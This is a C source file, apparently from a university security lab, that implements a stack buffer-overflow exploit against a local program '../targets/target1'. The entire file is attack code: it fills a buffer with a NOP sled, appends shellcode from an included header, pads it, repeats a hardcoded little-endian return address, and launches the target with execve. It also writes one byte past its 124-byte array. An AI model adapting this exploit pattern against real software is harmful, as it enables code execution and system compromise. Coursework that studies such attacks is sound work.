#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"

#define NOP_margin 75

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	char sploit_str[124];

	// target1 &buf is located at 0x2021fe50 to 0x2021feb0 (96 = 0x60)
	// Little Endian format
	char target_addr[] = "\x50\xfe\x21\x20";

	// Fill head with NOP
	int i = 0;
	for (; i < NOP_margin; ++i)
	{
		sploit_str[i] = NOP;
	}

	// Append the shellcode
	for (; i < (NOP_margin + strlen(shellcode)); ++i)
	{
		sploit_str[i] = shellcode[i - NOP_margin];
	}

	// Add padding to align the target buffer address
	int padding = ((strlen(shellcode) + 1) % 4);
	for (int j = 0; (j < (padding + 1)) && (padding != 0); ++j, ++i)
	{
		sploit_str[i] = NOP;
	}

	// Append the target buffer address
	for (; strlen(sploit_str) <= 120;)
	{
		strcat(sploit_str, target_addr);
	}

	sploit_str[124] = 0;

	args[0] = TARGET;
	args[1] = sploit_str;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
